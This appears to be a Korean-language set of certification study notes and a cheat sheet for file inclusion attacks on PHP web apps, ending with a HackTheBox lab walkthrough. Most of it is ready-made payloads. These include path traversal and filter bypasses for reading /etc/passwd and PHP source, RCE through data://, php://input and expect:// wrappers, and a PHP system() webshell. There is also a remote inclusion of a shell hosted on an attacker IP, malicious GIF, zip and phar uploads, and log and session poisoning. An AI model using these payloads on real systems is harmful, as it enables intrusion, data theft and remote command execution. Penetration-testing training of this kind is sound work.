# 파일 포함 공격

## 파일 포함



> [파일 경로 탐색(파일 포함이라고도 함)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#file-path-traversal) 에 대한 내 BSCP 연구 노트

### 로컬 파일 포함



| **명령**                                                                                                                 | **설명**                                                                                                            |
| ---------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
|  **기본 LFI**                                                                                                            |                                                                                                                   |
|  `/index.php?language=/etc/passwd`                                                                                     | [기본 LFI](https://academy.hackthebox.com/module/23/section/250)                                                    |
|  `/index.php?language=../../../../etc/passwd`                                                                          | 경로 탐색이 포함된 LFI - 대상 서버에서 유효한 사용자를 식별하는 방법입니다.                                                                     |
|  `/index.php?language=/../../../etc/passwd`                                                                            | 이름 접두사가 있는 LFI입니다.                                                                                                |
| `GET /index.php?language=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` | [파일 포함을 사용하여 시스템에서 사용자 이름을 찾습니다.](https://academy.hackthebox.com/module/23/section/251)                           |
|  `/index.php?language=./languages/../../../../etc/passwd`                                                              | 승인된 경로가 있는 LFI                                                                                                    |
|  `GET /index.php?language=languages/....//....//....//....//...//flag.txt`                                             | `languages/`승인된 전면 및 이스케이프 필터 경로가 있는 LFI .                                                                        |
|  **LFI 우회**                                                                                                            |                                                                                                                   |
|  `/index.php?language=....//....//....//....//....//etc/passwd`                                                        | 기본 경로 [순회 필터 우회](https://academy.hackthebox.com/module/23/section/1491)                                           |
|  `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`                              | URL 인코딩으로 필터 우회 - [온라인 URL 디코드 인코더](https://www.urldecoder.org/)                                                  |
|  `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]`                     | 경로 잘림을 사용하여 추가된 확장 무시(사용되지 않음) [추가된 확장 - 경로 잘림](https://academy.hackthebox.com/module/23/section/1491)            |
| `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done`                   | 이 bash 스크립트는 PHP 확장자를 필터링하고 자르는 데 필요한 2048배 문자열 탐색 경로를 생성합니다.                                                     |
|  `/index.php?language=../../../../etc/passwd%00`                                                                       | `null byte`(구식)을 사용하여 추가된 확장을 우회합니다.                                                                              |
|  `/index.php?language=php://filter/read=convert.base64-encode/resource=config`                                         | base64 필터를 사용하여 PHP 페이지의 소스 코드 읽기 - [PHP 필터를 사용한 소스 코드 공개](https://academy.hackthebox.com/module/23/section/1492) |

### 원격 코드 실행



> URL 스트림을 통해 명령을 직접 실행할 수 있는 Expect 래퍼입니다. Expect는 웹 셸과 매우 유사하게 작동합니다. 데이터 래퍼를 사용하여 PHP 코드를 포함한 외부 데이터를 포함할 수 있습니다. 그러나 데이터 래퍼는 `allow_url_include`PHP 구성에서 설정이 활성화된 경우에만 사용할 수 있습니다 .

### PHP 래퍼



| **명령**                                                                                                                                         | **설명**                                                                                    |
| ---------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
|  `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`                                      | 데이터 래퍼를 사용한 RCE [원격 명령 실행](https://academy.hackthebox.com/module/23/section/253)          |
| `echo '<?php system($_GET["cmd"]); ?>' \| base64`                                                                                              | 명령 실행을 위해 데이터 래퍼에 전달할 수 있는 웹셸로 위에서 사용된 base64 문자열을 생성합니다.                                 |
| `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"` | PHP 구성 확인, base64로 인코딩된 문자열이 있으면 이를 디코딩하고 허용\_url\_include에 대한 grep을 통해 해당 값을 확인할 수 있습니다. |
|  `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"`                   | 입력 래퍼가 포함된 RCE                                                                            |
|  `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`                                                                          | 예상 래퍼가 포함된 RCE                                                                            |

### RFI 원격 파일 포함



| **명령**                                                                                          | **설명**        |
| ----------------------------------------------------------------------------------------------- | ------------- |
|  `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | 호스트 웹 셸       |
|  `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`                        | 원격 PHP 웹 셸 포함 |

### LFI + 업로드



| **명령**                                                                          | **설명**                                                                                         |
| ------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
|  `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`                        | 악성 GIF 웹쉘을 제작하여 악성 이미지 생성                                                                      |
|  `/index.php?language=./profile_images/shell.gif&cmd=id`                        | 악성 업로드 이미지가 포함된 RCE                                                                            |
|  `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | 악성 [zip 아카이브를](https://academy.hackthebox.com/module/23/section/1493) 다음과 같이 생성합니다.`shell.jpg` |
|  `/index.php?language=zip://shell.zip%23shell.php&cmd=id`                       | 악성 업로드 zip이 포함된 RCE                                                                            |
|  `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`            | 악성 phar를 'jpg'로 생성하고 이를 phar 파일로 컴파일한 후 다음과 같이 이름을 바꿉니다.`shell.jpg`                            |
|  `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`     | 악성 업로드된 phar가 포함된 RCE                                                                          |

### 로그 세션 중독



| **명령**                                                                               | **설명**                                                                                           |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------ |
| `PHPSESSID=nguh23jsnmkjuvesphkhoo2ptt`                                               | 세션 쿠키의 예는 로그 경로를 다음과 같이 나타냅니다.`/var/lib/php/sessions/sess_nguh23jsnmkjuvesphkhoo2ptt`            |
|  `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`         | PHP 세션 매개변수 읽기                                                                                   |
| `<?php system($_GET["cmd"]);?>`                                                      | 이 웹쉘 URL은 중독에 사용되는 다음 페이로드로 인코딩됩니다.`%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`     |
|  `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`       | [포이즌 공격이 있는 웹 서버 로그](https://academy.hackthebox.com/module/23/section/252) 의 웹 셸을 사용한 포이즌 PHP 세션 |
|  `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`  | 중독된 PHP 세션을 통한 RCE                                                                               |
|  `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | 포이즌 서버 로그                                                                                        |
|  `/index.php?language=/var/log/apache2/access.log&cmd=id`                            | 중독된 PHP 세션을 통한 RCE                                                                               |

### 퍼징 LFI 매개변수 + 파일



| **명령**                                                                                                                                                                               | **설명**                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------- |
| `sudo python -m pyftpdlib -p 21`                                                                                                                                                     | Python의 pyftpdlib로 기본 FTP 서버 시작                                                                       |
| `impacket-smbserver -smb2support share $(pwd)`                                                                                                                                       | SMB 파일 공유 호스팅                                                                                         |
| `sudo python3 -m http.server <LISTENING_PORT>`                                                                                                                                       | shell.php를 호스팅하려면                                                                                     |
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php`                                                          | PHP 파일 퍼징                                                                                             |
|  `ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'`                                        | [FFUF 자동 스캐닝을](https://academy.hackthebox.com/module/23/section/1494) 사용하여 문서화되지 않은 웹 매개변수에 대한 퍼지 페이지 |
| `ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'`                                                   | [LFI 단어 목록](https://academy.hackthebox.com/module/23/section/1494) 이 포함된 Fuzz LFI 페이로드                |
|  `ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | 퍼즈 웹루트 경로                                                                                             |
| `ffuf -c -ic -w drtychai-lfi-wordlist.txt:FUZZ -u 'http://94.237.49.11:53690/ilf_admin/index.php?log=../../../../../../../..FUZZ' -fs 2046 -replay-proxy http://127.0.0.1:8080`      | 프록시를 통해 FFUF는 단어 목록 drtychai lfi가 포함된 식별된 LFI 주입 웹 매개변수입니다.                                           |
|  `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`                                                                     | 퍼지 서버 구성                                                                                              |
|  [LFI 단어 목록](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)                                                                                                     | SecList 퍼징 LFI                                                                                        |
| [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)                                                                                |                                                                                                       |
| [Linux용 Webroot 경로 단어 목록](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)                                         |                                                                                                       |
| [Windows용 Webroot 경로 단어 목록](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)                                     |                                                                                                       |
| [Linux용 서버 구성 단어 목록](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)                                                                          |                                                                                                       |
| [Windows용 서버 구성 단어 목록](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)                                                                      |                                                                                                       |

> 예: 웹 매개변수를 발견한 후 `view`Burp Suite는 이 LFI를 발견했습니다.

```
GET /index.php?view=../../../../../../../../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

### 파일 포함 기능



| **기능**                       | **콘텐츠 읽기** | **실행하다** | **원격 URL** |
| ---------------------------- | :--------: | :------: | :--------: |
| **PHP**                      |            |          |            |
| `include()`/`include_once()` |      ✅     |     ✅    |      ✅     |
| `require()`/`require_once()` |      ✅     |     ✅    |      ❌     |
| `file_get_contents()`        |      ✅     |     ❌    |      ✅     |
| `fopen()`/`file()`           |      ✅     |     ❌    |      ❌     |
| **NodeJS**                   |            |          |            |
| `fs.readFile()`              |      ✅     |     ❌    |      ❌     |
| `fs.sendFile()`              |      ✅     |     ❌    |      ❌     |
| `res.render()`               |      ✅     |     ✅    |      ❌     |
| **자바**                       |            |          |            |
| `include`                    |      ✅     |     ❌    |      ❌     |
| `import`                     |      ✅     |     ✅    |      ✅     |
| **.그물**                      |            |          |            |
| `@Html.Partial()`            |      ✅     |     ❌    |      ❌     |
| `@Html.RemotePartial()`      |      ✅     |     ❌    |      ✅     |
| `Response.WriteFile()`       |      ✅     |     ❌    |      ❌     |
| `include`                    |      ✅     |     ✅    |      ✅     |

## 기술 평가 - 파일 포함



> [LFI 기술 시나리오](https://academy.hackthebox.com/module/23/section/513)\
> INLANEFREIGHT 회사는 공개 웹 사이트 중 하나에 대해 웹 애플리케이션 평가를 수행하도록 귀하와 계약했습니다. 그들은 과거에 많은 평가를 거쳤지만 몇 가지 새로운 기능을 서둘러 추가했으며 특히 파일 포함/경로 탐색 취약성에 대해 우려하고 있습니다.

> 대상 IP 주소만 제공했으며 추가 정보는 제공하지 않았습니다. 83.136.252.24:46462

### 열거



> LFI 또는 파일 포함 주입 지점을 식별합니다.

```
ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.252.24:46462/FUZZ.php
```

[![LFI 기술 평가 ffuf](https://github.com/missteek/cpts-quick-references/raw/main/images/LFI-skills-assess-ffuf-1.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/LFI-skills-assess-ffuf-1.png)

> 웹 앱 루트의 식별된 페이지에서 각 페이지의 매개변수를 검색합니다.

```
ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.252.24:46462/about.php?FUZZ=value'
```

식별된 매개변수:`http://83.136.252.24:46462/index.php?page=value`

#### PHP 필터 읽기



> 페이지 의 소스 코드를 가져오세요 . 단 , 웹 애플리케이션이 자동으로 추가하므로 확장자를 `index.php`포함하지 마세요 .`php`

```
GET /index.php?page=php://filter/read=convert.base64-encode/resource=index 
```

> 응답 base64 문자열을 PHP 코드로 변환:

```
echo 'PCFET0NUWVBFIGh0hjyrujwergwrtbWw <snip> teyrjetyjtryjrytjCg== | base64 -d > index.php
cat index.php | grep -ie 'Admin'
```

[![LFI-기술-평가-php-필터-소스-코드](https://github.com/missteek/cpts-quick-references/raw/main/images/LFI-skills-assess-php-filter-source-code.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/LFI-skills-assess-php-filter-source-code.png)

> 동일한 방법 `error.php`과 `main.php`소스코드로 추출합니다.

> 소스 코드에서 다음 PHP 주석을 찾아보세요.

```
// echo '<li><a href="ilf_admin/index.php">Admin</a></li>';
```

[![LFI 기술 평가 식별](https://github.com/missteek/cpts-quick-references/raw/main/images/LFI-skills-assess-identified.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/LFI-skills-assess-identified.png)

> PHP 소스 코드 주석에서 발견된 관리 페이지를 평가하고 매개 `log`변수를 사용하여 파일을 읽습니다. [LFI + 로그 중독 기술 = RCE는](https://academy.hackthebox.com/module/23/section/252) 원격 코드 실행을 얻고 파일 시스템의 / 루트 디렉터리에서 플래그를 찾습니다.

#### 로그 포이즌



> FFUF 명령은 `nginx.conf`액세스 로그에 대한 경로를 나타내는 파일을 `/var/log/nginx/access.log`.

```
ffuf -c -ic -w /usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt:FUZZ -u 'http://94.237.49.11:53690/ilf_admin/index.php?log=../../../../../../../..FUZZ' -replay-proxy http://127.0.0.1:8080 -fs 2046
```

[![LFI-기술-평가-로그-경로](https://github.com/missteek/cpts-quick-references/raw/main/images/LFI-skills-assess-log-path.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/LFI-skills-assess-log-path.png)

> 로그에서 우리는 이 `user-agent`반영되고 저장되었음을 알 수 있습니다. 다음 값으로 삽입된 PHP 웹셸 코드 `User-Agent`:

```
<?php system($_GET['cmd']); ?>
```

[![LFI-기술-평가-로그-포이즌](https://github.com/missteek/cpts-quick-references/raw/main/images/LFI-skills-assess-log-poison.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/LFI-skills-assess-log-poison.png)

> 로그가 PHP 코드로 오염되면 대상에서 웹쉘 명령을 실행할 수 있습니다.

```
GET /ilf_admin/index.php?log=../../../../../../../../../var/log/nginx/access.log&cmd=ls+/+-al HTTP/1.1
```

> RCE로 목표물의 깃발을 획득하세요.

```
/ilf_admin/index.php?log=../../../../../../../../../var/log/nginx/access.log&cmd=cat+/flag_.txt
```
